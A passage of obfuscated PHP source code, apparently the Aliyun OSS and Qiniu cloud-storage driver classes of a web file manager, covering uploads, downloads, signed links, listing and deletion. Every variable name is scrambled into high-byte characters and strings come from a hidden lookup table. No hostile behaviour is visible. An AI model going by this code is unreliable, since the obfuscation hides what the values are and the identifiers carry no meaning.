$ß¯º×÷® = $Şà¬åè->getListPart(); $•¿Æ»ô… = array(); foreach ($ß¯º×÷® as $çÚ¯”­Ã) { $•¿Æ»ô…[] = array($÷»à€¥Î[1430] => $çÚ¯”­Ã->getPartNumber(), $÷»à€¥Î[1431] => trim($çÚ¯”­Ã->getETag(), $÷»à€¥Î[128])); } unset($ ş¥¡ä¦[$÷»à€¥Î[250]], $ ş¥¡ä¦[$÷»à€¥Î[254]]); $İñŠ ¡¨ = $this->multiUploadAuthData($æµ‘œ«ì, $ ş¥¡ä¦); if (empty($İñŠ ¡¨)) { return !1; } return array($÷»à€¥Î[258] => $İñŠ ¡¨, $÷»à€¥Î[249] => $ ş¥¡ä¦[$÷»à€¥Î[249]], $÷»à€¥Î[260] => $•¿Æ»ô…); } public function download($áæ¦Ê¯, $¤É€æ³å) { if ($this->isFolder($áæ¦Ê¯)) { return !1; } try { $ŠŒ€İß™ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¤É€æ³å); $ŠŒ€İß™ = $this->trafficLimit($_SERVER[‚ûòÉ˜ş][119], $ŠŒ€İß™); $this->client->getObject($this->bucket, $this->pathEncode($áæ¦Ê¯), $ŠŒ€İß™); } catch (OSS\Core\OssException $™ØŒœˆş) { return !1; } return $¤É€æ³å; } public function fileSubstr($É˜ÙÂÖÜ, $ÜÅ´ÌÑÖ = 0, $ãôÄ¯·Ê = false) { if ($ÜÅ´ÌÑÖ === -1) { $ƒÃÊ‚«› = array(); } else { if ($ãôÄ¯·Ê === !1) { $ç„ÛÃÖŠ = $this->size($É˜ÙÂÖÜ); } else { $ç„ÛÃÖŠ = $ÜÅ´ÌÑÖ + $ãôÄ¯·Ê - 1; } $ƒÃÊ‚«› = array(OSS\OssClient::OSS_RANGE => "{$ÜÅ´ÌÑÖ}\x2d{$ç„ÛÃÖŠ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($É˜ÙÂÖÜ), $ƒÃÊ‚«›); } catch (OSS\Core\OssException $Ñå¬ĞÆ ) { think_exception($Ñå¬ĞÆ ->getMessage()); return !1; } } private function trafficLimit($ªóÌºùÙ, $ˆ‘ ²œæ = array()) { $ş¡«Ö•¿ =& $_SERVER[‚ûòÉ˜ş]; if ($ªóÌºùÙ == $ş¡«Ö•¿[1436] && $this->isUploadServer() || $ªóÌºùÙ == $ş¡«Ö•¿[119] && $this->isFileOutServer()) { return $ˆ‘ ²œæ; } $œä‚ûø¦ = floatval($GLOBALS[$ş¡«Ö•¿[6]][$ş¡«Ö•¿[99]][$ş¡«Ö•¿[117]][$ªóÌºùÙ]) * 1024 * 1024 * 8; if (!$œä‚ûø¦) { return $ˆ‘ ²œæ; } $œä‚ûø¦ = $œä‚ûø¦ < 819200 ? 819200 : ($œä‚ûø¦ > 838860800 ? 838860800 : $œä‚ûø¦); $ˆ‘ ²œæ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($œä‚ûø¦); return $ˆ‘ ²œæ; } public function link($ø¹‰Âóã, $¨ÈÓŸëÙ = array()) { $Øˆ°¨Î‰ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->exist($ø¹‰Âóã) || $this->isFolder($ø¹‰Âóã)) { return !1; } try { $¨ÈÓŸëÙ = $this->trafficLimit($Øˆ°¨Î‰[119], $¨ÈÓŸëÙ); $·£õ§Ôû = $this->client->signUrl($this->bucket, $this->pathEncode($ø¹‰Âóã), 3600 * 12, $Øˆ°¨Î‰[255], $¨ÈÓŸëÙ); return $this->getCdnLink($·£õ§Ôû); } catch (OSS\Core\OssException $áàûÖùª) { return !1; } } public function fileOut($š°€£æ¯, $¼ÂÆæíé = false, $âÒÕ¤¿ì = false, $İ¨ŒĞƒï = '') { $Ä©Ó«Œú =& $_SERVER[‚ûòÉ˜ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($š°€£æ¯, $¼ÂÆæíé, $âÒÕ¤¿ì, $İ¨ŒĞƒï); } if (!$âÒÕ¤¿ì) { $âÒÕ¤¿ì = $this->pathThis($š°€£æ¯); } $âÒÕ¤¿ì = rawurlencode($âÒÕ¤¿ì); $ÌƒÍ¥ Õ = get_file_mime(get_path_ext($âÒÕ¤¿ì)); if ($ÌƒÍ¥ Õ == $Ä©Ó«Œú[242]) { return parent::fileOut($š°€£æ¯, $¼ÂÆæíé, $âÒÕ¤¿ì, $İ¨ŒĞƒï); } $¼ÂÆæíé = $¼ÂÆæíé ? $Ä©Ó«Œú[1446] : $Ä©Ó«Œú[1447]; $ÃÏÆñœä = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ä©Ó«Œú[1448] . rawurlencode("{$¼ÂÆæíé}\x3b\x66\151\x6c\x65\x6e\x61\x6d\x65\75{$âÒÕ¤¿ì}")); $ÃÏÆñœä[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ä©Ó«Œú[1449] . rawurlencode($ÌƒÍ¥ Õ); $ìÛÍğÄÖ = $this->link($š°€£æ¯, $ÃÏÆñœä); $this->fileOutLink($ìÛÍğÄÖ); } public function fileOutServer($·Æëõëì, $©‹ˆŸ— = false, $¯¨¼Õõœ = false, $ƒÈì«şá = '') { parent::fileOut($·Æëõëì, $©‹ˆŸ—, $¯¨¼Õõœ, $ƒÈì«şá); } public function fileOutImage($ËéæÄ–, $ÉºÏãëÓ = 250) { if ($this->size($ËéæÄ–) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ËéæÄ–, $ÉºÏãëÓ); } $É ‚î«¡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‚ûòÉ˜ş][1450] . $ÉºÏãëÓ); $¥ ¼¹³¶ = $this->link($ËéæÄ–, $É ‚î«¡); $this->fileOutLink($¥ ¼¹³¶); } public function fileOutImageServer($À›êß¸®, $ÎÉ«áÕ = 250) { parent::fileOutImage($À›êß¸®, $ÎÉ«áÕ); } public function fileOutLink($Ä”¦˜ô®) { $£’£çÎ‘ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->isCdnHost() && substr($Ä”¦˜ô®, 0, 7) == $£’£çÎ‘[1371]) { $Ä”¦˜ô® = $£’£çÎ‘[1372] . substr($Ä”¦˜ô®, 7); } header($£’£çÎ‘[172] . $Ä”¦˜ô®); die; } public function hashMd5($ÅŞ˜¥´‘, $ÏœÔéˆ² = '') { $“¿úøäô =& $_SERVER[‚ûòÉ˜ş]; $²·ú˜µ» = $this->_objectMeta($ÅŞ˜¥´‘); if (!$²·ú˜µ») { return $“¿úøäô[12]; } if (!isset($²·ú˜µ»[$“¿úøäô[1426]]) && !empty($ÏœÔéˆ²)) { $›íÁÅ‹Œ = $this->updateObjMeta($ÅŞ˜¥´‘, array($“¿úøäô[1426] => $ÏœÔéˆ²)); $²·ú˜µ»[$“¿úøäô[1426]] = $›íÁÅ‹Œ ? $ÏœÔéˆ² : $“¿úøäô[12]; } return isset($²·ú˜µ»[$“¿úøäô[1426]]) ? strtolower($²·ú˜µ»[$“¿úøäô[1426]]) : $“¿úøäô[12]; } public function size($ôÔüõ—) { $ƒÁä»Íé = $this->objectMeta($ôÔüõ—); return $ƒÁä»Íé ? $ƒÁä»Íé[$_SERVER[‚ûòÉ˜ş][86]] : 0; } public function info($ïÏÖÎš±) { if ($this->isFolder($ïÏÖÎš±)) { return $this->folderInfo($ïÏÖÎš±); } else { if ($this->isFile($ïÏÖÎš±)) { return $this->fileInfo($ïÏÖÎš±); } } return !1; } public function exist($¡è´³†­) { return $this->isFile($¡è´³†­) || $this->isFolder($¡è´³†­); } public function isFile($ÙùÛä×ú) { return !$this->isFolder($ÙùÛä×ú) && $this->objectMeta($ÙùÛä×ú); } public function isFolder($…“Ì«¨) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][176], $…“Ì«¨); } protected function objectMeta($×äğåò) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][178], $×äğåò); } protected function _objectMeta($±–˜›šé) { $ß‹õ¥Ûœ =& $_SERVER[‚ûòÉ˜ş]; try { $°¢¿ÂéÉ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($±–˜›šé)); } catch (OSS\Core\OssException $Ñùß˜¡•) { $°¢¿ÂéÉ = !1; } if ($°¢¿ÂéÉ) { $°¢¿ÂéÉ[$ß‹õ¥Ûœ[86]] = intval($°¢¿ÂéÉ[$ß‹õ¥Ûœ[1424]]); } return $°¢¿ÂéÉ; } protected function _isFolder($…·¶Áû†) { $Â½ì§¦À =& $_SERVER[‚ûòÉ˜ş]; if ($…·¶Áû† == $Â½ì§¦À[12] || $…·¶Áû† == $Â½ì§¦À[8]) { return !0; } $¬·Î®¶ = array($Â½ì§¦À[1419] => $Â½ì§¦À[8], $Â½ì§¦À[1420] => rtrim($…·¶Áû†, $Â½ì§¦À[8]) . $Â½ì§¦À[8], $Â½ì§¦À[1421] => 1, $Â½ì§¦À[1422] => $Â½ì§¦À[12]); $±ü§Ã…¬ = $this->client->listObjects($this->bucket, $¬·Î®¶); if ($±ü§Ã…¬->getObjectList() || $±ü§Ã…¬->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÖğÇ™á”) { parent::__construct(); require_once SDK_DIR . $_SERVER[‚ûòÉ˜ş][1451]; $this->_init($ÖğÇ™á”); } public function _init($ÇÑÁªÛæ) { $ÆÔ†ĞÎë =& $_SERVER[‚ûòÉ˜ş]; $this->config = $ÇÑÁªÛæ; foreach ($ÇÑÁªÛæ as $–§±÷—É => $‚•À÷îØ) { if (isset($this->{$–§±÷—É})) { $this->{$–§±÷—É} = $‚•À÷îØ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÆÔ†ĞÎë[1452] . LNG($ÆÔ†ĞÎë[1410])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($„¯íİÔ, $ğéë¯ò = '', $ºİ¸•Ô = REPEAT_RENAME) { if ($this->setContent($„¯íİÔ, $ğéë¯ò)) { return $this->getPathOuter($„¯íİÔ); } return !1; } public function mkdir($«Ë¡§ÈÍ, $şûõ²˜ï = REPEAT_SKIP) { $Å”ü¾¨ù =& $_SERVER[‚ûòÉ˜ş]; $É×ıâ = trim($«Ë¡§ÈÍ, $Å”ü¾¨ù[8]); if ($this->_isFolder($É×ıâ)) { return $this->getPathOuter($É×ıâ); } $«Ë¡§ÈÍ = $É×ıâ . $Å”ü¾¨ù[8]; $¸ş²Ÿì¦ = get_path_this($É×ıâ); $¬ñ° ·¿ = $«Ë¡§ÈÍ . $¸ş²Ÿì¦; if (!$this->mkfile($¬ñ° ·¿)) { return !1; } if (!$this->moveFile($¬ñ° ·¿, $«Ë¡§ÈÍ)) { $this->delFile($¬ñ° ·¿); return !1; } return $this->getPathOuter($É×ıâ); } public function copyFile($ï¤†‘ø», $®¹““³) { $ó‚Æã¦– = $this->bucketManager->copy($this->bucket, $ï¤†‘ø», $this->bucket, $®¹““³, !0); return $ó‚Æã¦– ? !1 : $this->getPathOuter($®¹““³); } public function moveFile($ğ€ÇÈÔÙ, $ãšˆ‹şä) { $Æ¨“©ºô = $this->bucketManager->move($this->bucket, $ğ€ÇÈÔÙ, $this->bucket, $ãšˆ‹şä, !0); return $Æ¨“©ºô ? !1 : $this->getPathOuter($ãšˆ‹şä); } public function delFile($œ‘š Â±) { if (!$this->exist($œ‘š Â±)) { return !0; } $ª’ÇÛä = $this->bucketManager->delete($this->bucket, $œ‘š Â±); return $ª’ÇÛä ? !1 : !0; } public function delFolder($ä¶ÏŸĞ) { $€Ò…İ³ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->exist($ä¶ÏŸĞ)) { return !0; } $this->listItemCache = !1; $«‚ª»¥Ş = $this->fileList($ä¶ÏŸĞ); $this->listItemCache = !0; $¶¹ÉĞìÀ = trim($ä¶ÏŸĞ, $€Ò…İ³[8]) . $€Ò…İ³[8]; if (!empty($ä¶ÏŸĞ) && $ä¶ÏŸĞ !== $€Ò…İ³[222] && !in_array($¶¹ÉĞìÀ, $«‚ª»¥Ş[$€Ò…İ³[92]])) { $«‚ª»¥Ş[$€Ò…İ³[92]][] = $¶¹ÉĞìÀ; } $£İªœÖò = $this->delByBatch($«‚ª»¥Ş[$€Ò…İ³[93]]); if (!$£İªœÖò) { return !1; } $£İªœÖò = $this->delByBatch($«‚ª»¥Ş[$€Ò…İ³[92]]); if (!$£İªœÖò) { return !1; } return $this->delFile($¶¹ÉĞìÀ); } private function delByBatch($èï£Œ”Ü) { foreach (array_chunk($èï£Œ”Ü, 1000) as $×êœ…°) { $œ©Äš” = $this->bucketManager->buildBatchDelete($this->bucket, $×êœ…°); list($‡Ù¯üêà, $ş¥‚¬›») = $this->bucketManager->batch($œ©Äš”); if ($ş¥‚¬›») { return !1; } } return !0; } public function rename($ˆÛ‘åòœ, $Æ¸•ø•) { return $this->renameObject($ˆÛ‘åòœ, $Æ¸•ø•); } public function fileInfo($—ü¦Áîº, $ËŸø¹æ = false, $éÚ±¥õş = array()) { $––Î®© =& $_SERVER[‚ûòÉ˜ş]; $«Ô›½İ« = array($––Î®©[42] => $this->pathThis($—ü¦Áîº), $––Î®©[94] => $this->getPathOuter($––Î®©[8] . $—ü¦Áîº), $––Î®©[43] => $––Î®©[224], $––Î®©[86] => isset($éÚ±¥õş[$––Î®©[1453]]) ? $éÚ±¥õş[$––Î®©[1453]] : 0, $––Î®©[185] => $this->ext($—ü¦Áîº)); if ($ËŸø¹æ) { return $«Ô›½İ«; } $«Ô›½İ«[$––Î®©[225]] = $«Ô›½İ«[$––Î®©[95]] = 0; $«Ô›½İ«[$––Î®©[226]] = $«Ô›½İ«[$––Î®©[227]] = !0; if (empty($éÚ±¥õş)) { $éÚ±¥õş = $this->objectMeta($—ü¦Áîº); if (!$éÚ±¥õş) { return $«Ô›½İ«; } } if (isset($éÚ±¥õş[$––Î®©[228]]) && $éÚ±¥õş[$––Î®©[228]]) { $«Ô›½İ«[$––Î®©[229]] = $éÚ±¥õş[$––Î®©[228]]; } if (isset($éÚ±¥õş[$––Î®©[238]]) && $éÚ±¥õş[$––Î®©[238]]) { $«Ô›½İ«[$––Î®©[229]] = $éÚ±¥õş[$––Î®©[238]]; } if (isset($éÚ±¥õş[$––Î®©[1454]])) { $«Ô›½İ«[$––Î®©[95]] = substr($éÚ±¥õş[$––Î®©[1454]] . $––Î®©[12], 0, 10); } if (isset($éÚ±¥õş[$––Î®©[1453]])) { $«Ô›½İ«[$––Î®©[86]] = $éÚ±¥õş[$––Î®©[1453]]; } return $«Ô›½İ«; } public function folderInfo($ÈÑõ¾ˆá, $ü¥¤©»¹ = false) { $á¤É®„Ñ =& $_SERVER[‚ûòÉ˜ş]; $Ù”İÕÛ = array($á¤É®„Ñ[42] => $this->pathThis($ÈÑõ¾ˆá), $á¤É®„Ñ[94] => $this->getPathOuter($á¤É®„Ñ[8] . $ÈÑõ¾ˆá), $á¤É®„Ñ[43] => $á¤É®„Ñ[85]); if ($ü¥¤©»¹) { return $Ù”İÕÛ; } $Ù”İÕÛ[$á¤É®„Ñ[225]] = $Ù”İÕÛ[$á¤É®„Ñ[95]] = 0; $Ù”İÕÛ[$á¤É®„Ñ[226]] = $Ù”İÕÛ[$á¤É®„Ñ[227]] = !0; $ÈÑõ¾ˆá = rtrim($ÈÑõ¾ˆá, $á¤É®„Ñ[8]) . $á¤É®„Ñ[8]; $‚¢£‘õ = $this->objectMeta($ÈÑõ¾ˆá); if (isset($‚¢£‘õ[$á¤É®„Ñ[1454]])) { $Ù”İÕÛ[$á¤É®„Ñ[95]] = substr($‚¢£‘õ[$á¤É®„Ñ[1454]] . $á¤É®„Ñ[12], 0, 10); } return $Ù”İÕÛ; } public function listPath($ñ‘êéşÉ, $í¹şÅ¼» = false) { $ èéÉ¡é =& $_SERVER[‚ûòÉ˜ş]; $°İ¥¨„ = $this->fileList($ñ‘êéşÉ, $ èéÉ¡é[8], !0); foreach ($°İ¥¨„[$ èéÉ¡é[92]] as $°ÙÖ¹Ç => $©ŸÇƒÓ¡) { $°İ¥¨„[$ èéÉ¡é[92]][$°ÙÖ¹Ç] = $this->folderInfo($©ŸÇƒÓ¡, $í¹şÅ¼»); } foreach ($°İ¥¨„[$ èéÉ¡é[93]] as $°ÙÖ¹Ç => $©ŸÇƒÓ¡) { $°İ¥¨„[$ èéÉ¡é[93]][$°ÙÖ¹Ç] = $this->fileInfo($©ŸÇƒÓ¡[$ èéÉ¡é[104]], $í¹şÅ¼», $©ŸÇƒÓ¡); } return $°İ¥¨„; } public function has($ıÀ‰®¯», $ÒñÀ°‡ = false, $´å›²Æñ = true) { $¨Õ©ã…† =& $_SERVER[‚ûòÉ˜ş]; $ıÀ‰®¯» = trim($ıÀ‰®¯», $¨Õ©ã…†[8]); $°ìÉÂ÷š = empty($ıÀ‰®¯») && $ıÀ‰®¯» !== $¨Õ©ã…†[222] ? $¨Õ©ã…†[12] : $ıÀ‰®¯» . $¨Õ©ã…†[8]; $îœŒ£ãÃ = $¨Õ©ã…†[12]; $Óá¬¨ò = 500; $³öß•“ö = $¨Õ©ã…†[8]; $£²´ªâü = $‘½­®¯€ = 0; while (!0) { check_abort(); list($¹Ëé²±, $µµÔ—ï) = $this->bucketManager->listFiles($this->bucket, $°ìÉÂ÷š, $îœŒ£ãÃ, $Óá¬¨ò, $³öß•“ö); if ($µµÔ—ï) { break; } $îœŒ£ãÃ = array_key_exists($¨Õ©ã…†[1422], $¹Ëé²±) ? $îœŒ£ãÃ = $¹Ëé²±[$¨Õ©ã…†[1455]] : $¨Õ©ã…†[12]; if ($ÒñÀ°‡) { if (!empty($¹Ëé²±[$¨Õ©ã…†[1456]])) { $£²´ªâü += count($¹Ëé²±[$¨Õ©ã…†[1456]]); } if (!empty($¹Ëé²±[$¨Õ©ã…†[1457]])) { $‘½­®¯€ += count($¹Ëé²±[$¨Õ©ã…†[1457]]); } if ($îœŒ£ãÃ === $¨Õ©ã…†[12]) { break; } continue; } if ($´å›²Æñ) { if (!empty($¹Ëé²±[$¨Õ©ã…†[1456]])) { return !0; } } else { if (!empty($¹Ëé²±[$¨Õ©ã…†[1457]])) { return !0; } } if ($îœŒ£ãÃ === $¨Õ©ã…†[12]) { break; } } if ($ÒñÀ°‡) { return array($¨Õ©ã…†[233] => $£²´ªâü, $¨Õ©ã…†[234] => $‘½­®¯€); } return !1; } public function listAll($¼¨Í¯Ò¶) { $¦¯Ï˜íÊ =& $_SERVER[‚ûòÉ˜ş]; $¯¹éï = $this->fileList($¼¨Í¯Ò¶, $¦¯Ï˜íÊ[12], !0); $òŠ‘¯à› = array_to_keyvalue($¯¹éï[$¦¯Ï˜íÊ[93]], $¦¯Ï˜íÊ[42]); foreach ($¯¹éï[$¦¯Ï˜íÊ[92]] as $äìĞÃÁ) { if (is_string($äìĞÃÁ)) { $òŠ‘¯à›[$äìĞÃÁ] = array($¦¯Ï˜íÊ[86] => 0); } } return $this->listAllFiles($¼¨Í¯Ò¶, $òŠ‘¯à›); } private function fileList($‰ãÆ®ù„, $®§ıáÎú = '', $ö§÷À‡ = 0) { $¢¿©Û…Í =& $_SERVER[‚ûòÉ˜ş]; $‰ãÆ®ù„ = trim($‰ãÆ®ù„, $¢¿©Û…Í[8]); $×ıÍ„¯ = empty($‰ãÆ®ù„) && $‰ãÆ®ù„ !== $¢¿©Û…Í[222] ? $¢¿©Û…Í[12] : $‰ãÆ®ù„ . $¢¿©Û…Í[8]; $û…íÇ”‰ = $¢¿©Û…Í[12]; $É˜ÑÃÍİ = 1000; $ıÅ¼Î¯à = $ôøğç‘ = array(); while (!0) { check_abort(); list($¶¡ˆˆà³, $Æà„„÷) = $this->bucketManager->listFiles($this->bucket, $×ıÍ„¯, $û…íÇ”‰, $É˜ÑÃÍİ, $®§ıáÎú); if ($Æà„„÷) { break; } $û…íÇ”‰ = array_key_exists($¢¿©Û…Í[1422], $¶¡ˆˆà³) ? $û…íÇ”‰ = $¶¡ˆˆà³[$¢¿©Û…Í[1455]] : $¢¿©Û…Í[12]; $„©…ÄÊÏ = isset($¶¡ˆˆà³[$¢¿©Û…Í[1456]]) ? $¶¡ˆˆà³[$¢¿©Û…Í[1456]] : array(); $“Õ¼üäõ = isset($¶¡ˆˆà³[$¢¿©Û…Í[1457]]) ? $¶¡ˆˆà³[$¢¿©Û…Í[1457]] : array(); foreach ($„©…ÄÊÏ as $ëïŠÈóç) { if ($ëïŠÈóç[$¢¿©Û…Í[104]] == $×ıÍ„¯) { continue; } $‰æ±Â¹Š = $ëïŠÈóç[$¢¿©Û…Í[104]]; $©õÆØ” = $ëïŠÈóç[$¢¿©Û…Í[1453]]; $ëïŠÈóç[$¢¿©Û…Í[86]] = $©õÆØ”; $¿Î‰Áñ‘ = $©õÆØ” == 0 && substr($‰æ±Â¹Š, strlen($‰æ±Â¹Š) - 1, 1) == $¢¿©Û…Í[8] ? !0 : !1; $this->cacheMethodInfoSet($‰æ±Â¹Š, $¿Î‰Áñ‘, $ëïŠÈóç); if ($¿Î‰Áñ‘) { $ıÅ¼Î¯à[] = $‰æ±Â¹Š; continue; } $ôøğç‘[] = $ö§÷À‡ ? $ëïŠÈóç : $‰æ±Â¹Š; } foreach ($“Õ¼üäõ as $‰æ±Â¹Š) { if ($‰æ±Â¹Š == $×ıÍ„¯) { continue; } $ıÅ¼Î¯à[] = $‰æ±Â¹Š; $this->cacheMethodInfoSet($‰æ±Â¹Š, !0); } if ($û…íÇ”‰ === $¢¿©Û…Í[12]) { break; } } $this->cacheMethodInfoSet($‰ãÆ®ù„, !0); return array($¢¿©Û…Í[92] => $ıÅ¼Î¯à, $¢¿©Û…Í[93] => $ôøğç‘); } public function canRead($Á´ƒƒîÃ) { return $this->exist($Á´ƒƒîÃ) ? !0 : !1; } public function canWrite($ÍÈŸİš) { return $this->exist($ÍÈŸİš) ? !0 : !1; } public function getContent($îôøç¹) { return $this->fileSubstr($îôøç¹, 0, -1); } public function setContent($à‹†í’ç, $Œ³¤Çœ = '') { $ÚŞ‹¬Ø÷ = $this->tempFile($this->pathThis($à‹†í’ç)); file_put_contents($ÚŞ‹¬Ø÷, $Œ³¤Çœ); if ($this->upload($à‹†í’ç, $ÚŞ‹¬Ø÷)) { $this->tempFileRemve($ÚŞ‹¬Ø÷); return !0; } return !1; } public function refreshUrls($¦âĞûÛ) { $Ñ´Ö¤™‡ =& $_SERVER[‚ûòÉ˜ş]; $îî‹Û¢µ = array(); if (is_array($¦âĞûÛ)) { foreach ($¦âĞûÛ as $èÉóçÖî) { $îî‹Û¢µ[] = $this->link($èÉóçÖî); } } else { $îî‹Û¢µ[] = $this->link($¦âĞûÛ); } $åÀÇ‡÷± = new Qiniu\Cdn\CdnManager($this->auth); list($ä¯†èª˜, $Üïë™”á) = $åÀÇ‡÷±->refreshUrls($îî‹Û¢µ); if ($Üïë™”á) { return !1; } return $ä¯†èª˜[$Ñ´Ö¤™‡[1223]] == $Ñ´Ö¤™‡[799] ? !0 : !1; } public function fileSubstr($ÈÂòÜÔ, $û¸Ü¢ä¡, $ºàÏ®ê) { $¢¾û“¾ =& $_SERVER[‚ûòÉ˜ş]; if (!($¹ôŞµƒß = $this->link($ÈÂòÜÔ))) { return !1; } $¥¹İ•åÔ = !1; if ($ºàÏ®ê > 0) { $›¼ÜÎ›‚ = $û¸Ü¢ä¡ + $ºàÏ®ê - 1; $¥¹İ•åÔ = array($¢¾û“¾[1458] . $û¸Ü¢ä¡ . $¢¾û“¾[438] . $›¼ÜÎ›‚); } $¤š‹ÎÕô = url_request($¹ôŞµƒß, $¢¾û“¾[255], !1, $¥¹İ•åÔ); return $¤š‹ÎÕô[$¢¾û“¾[790]] ? $¤š‹ÎÕô[$¢¾û“¾[1243]] : !1; } public function upload($ùíÚÄò, $Âäó©Ìª, $ãßÂÂëù = false, $øÅ¡î = REPEAT_REPLACE) { $†ÇÈ´ÀÃ = new Qiniu\Storage\UploadManager(); $É·ÔßÄ’ = $this->auth->uploadToken($this->bucket, $ùíÚÄò); $â»¤Šà‚ = get_file_mime(get_path_ext($Âäó©Ìª)); list($¦„ µÏø, $üœ  şö) = $†ÇÈ´ÀÃ->putFile($É·ÔßÄ’, $ùíÚÄò, $Âäó©Ìª, null, $â»¤Šà‚); return $üœ  şö ? !1 : $this->getPathOuter($ùíÚÄò); } public function uploadFormData($ŒÊí”÷®, $¢²Íğ«  = 3600) { return $this->uploadToken($ŒÊí”÷®, $¢²Íğ« ); } public function multiUploadFormData($ÊÂßªš…, $ÛĞš  – = 3600) { return $this->uploadToken($ÊÂßªš…, $ÛĞš  –); } private function uploadToken($¢•Èş•, $´êØò©ó = 3600) { $Ò—ÁÙÃÛ =& $_SERVER[‚ûòÉ˜ş]; $ªóŞ‚çÛ = $´êØò©ó; $Óá°¿‚Š = array($Ò—ÁÙÃÛ[1459] => $Ò—ÁÙÃÛ[1460]); $äÖÔÅ§Æ = $¢•Èş•; $Úˆ†Ú¨ = $this->auth->uploadToken($this->bucket, $äÖÔÅ§Æ, $ªóŞ‚çÛ, $Óá°¿‚Š, !0); $ˆãË†ôç = empty($this->region) || $this->region == $Ò—ÁÙÃÛ[1461] ? $Ò—ÁÙÃÛ[12] : $Ò—ÁÙÃÛ[438] . $this->region; $Ø¢ış–Ê = http_type() . "\x3a\x2f\x2f\x75\160\x6c\x6f\141\144{$ˆãË†ôç}\x2e\x71\151\x6e\x69\x75\x70\x2e\x63\157\155\x2f"; return array($Ò—ÁÙÃÛ[1462] => $Úˆ†Ú¨, $Ò—ÁÙÃÛ[1463] => $Ø¢ış–Ê); } public function download($½†Îáœø, $½Ñ‡çÈ) { $÷›Ó‚Âò = IO::getPathInner(IO::mkfile($½Ñ‡çÈ)); if (!($’ïœñô = $this->link($½†Îáœø))) { return !1; } $¨ïÇèÉ = 0; $´ı×—û¡ = 1024 * 200; $ôÇÂåŠ = fopen($÷›Ó‚Âò, $_SERVER[‚ûòÉ˜ş][1464]); while (!0) { $º®µ˜“ˆ = $this->fileSubstr($½†Îáœø, $¨ïÇèÉ, $´ı×—û¡); if ($º®µ˜“ˆ === !1) { return !1; } fwrite($ôÇÂåŠ, $º®µ˜“ˆ); $¨ïÇèÉ += $´ı×—û¡; if (strlen($º®µ˜“ˆ) < $´ı×—û¡) { break; } } fclose($ôÇÂåŠ); return $½Ñ‡çÈ; } public function link($‹Øï…î, $«¬êöı = '') { if (!$this->isFile($‹Øï…î)) { return !1; } $üÉÁ˜²ı = $this->getHost() . $_SERVER[‚ûòÉ˜ş][8] . $this->pathEncode($‹Øï…î) . $«¬êöı; return $this->auth->privateDownloadUrl($üÉÁ˜²ı, 3600 * 12); } public function fileOut($ô‰õÊ‹¦, $ÍÏôËå = false, $íò½ğëì = false, $ùÍÀ»‹Â = '') { $ÂŞ©¨â =& $_SERVER[‚ûòÉ˜ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($ô‰õÊ‹¦, $ÍÏôËå, $íò½ğëì, $ùÍÀ»‹Â); } if (!$íò½ğëì) { $íò½ğëì = $this->pathThis($ô‰õÊ‹¦); } $åÚ¢øäí = $ÍÏôËå ? $ÂŞ©¨â[1465] . rawurlencode($íò½ğëì) : $ÂŞ©¨â[12]; $ãÙçßºí = $this->link($ô‰õÊ‹¦, $åÚ¢øäí); $this->fileOutLink($ãÙçßºí); } public function fileOutServer($¹´ÏôÙŸ, $¹£Œ‡ı¢ = false, $İòƒîÓü = false, $êÒ›¶§‡ = '') { parent::fileOut($¹´ÏôÙŸ, $¹£Œ‡ı¢, $İòƒîÓü, $êÒ›¶§‡); } public function fileOutImage($È‰˜ÍÂö, $æ’«ßı = 250) { $®•úÄØª = $this->link($È‰˜ÍÂö, $_SERVER[‚ûòÉ˜ş][1466] . $æ’«ßı); $this->fileOutLink($®•úÄØª); } public function fileOutImageServer($ŞüÀÙÓ³, $í±À‰éÇ = 250) { parent::fileOutImage($ŞüÀÙÓ³, $í±À‰éÇ); } public function hashMd5($Í±©ï•ò) { $’ŠÑúƒ¸ =& $_SERVER[‚ûòÉ˜ş]; $ƒ´ßáÑ = $this->objectMeta($Í±©ï•ò); return isset($ƒ´ßáÑ[$’ŠÑúƒ¸[238]]) ? $ƒ´ßáÑ[$’ŠÑúƒ¸[238]] : !1; $òöß×Öé = $this->link($Í±©ï•ò, $’ŠÑúƒ¸[1467]); } public function size($íè´ä€—) { $ßÔéœšÎ = $this->objectMeta($íè´ä€—); return $ßÔéœšÎ ? $ßÔéœšÎ[$_SERVER[‚ûòÉ˜ş][86]] : 0; } public function info($¨ñß½Ë‹) { if ($this->isFolder($¨ñß½Ë‹)) { return $this->folderInfo($¨ñß½Ë‹); } else { if ($this->isFile($¨ñß½Ë‹)) { return $this->fileInfo($¨ñß½Ë‹); } } return !1; } public function exist($­Ì½íˆ×) { return $this->isFile($­Ì½íˆ×) || $this->isFolder($­Ì½íˆ×); } public function isFile($Ñî§“Ó) { return !$this->isFolder($Ñî§“Ó) && $this->objectMeta($Ñî§“Ó); } public function isFolder($àŸ‡æêã) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][176], $àŸ‡æêã); } protected function objectMeta($ÙĞè©ÌÉ) { return $this->cacheMethod($_SERVER[‚ûòÉ˜ş][178], $ÙĞè©ÌÉ); } protected function _objectMeta($°ëá¥¨µ) { $´Ñ½Áâ =& 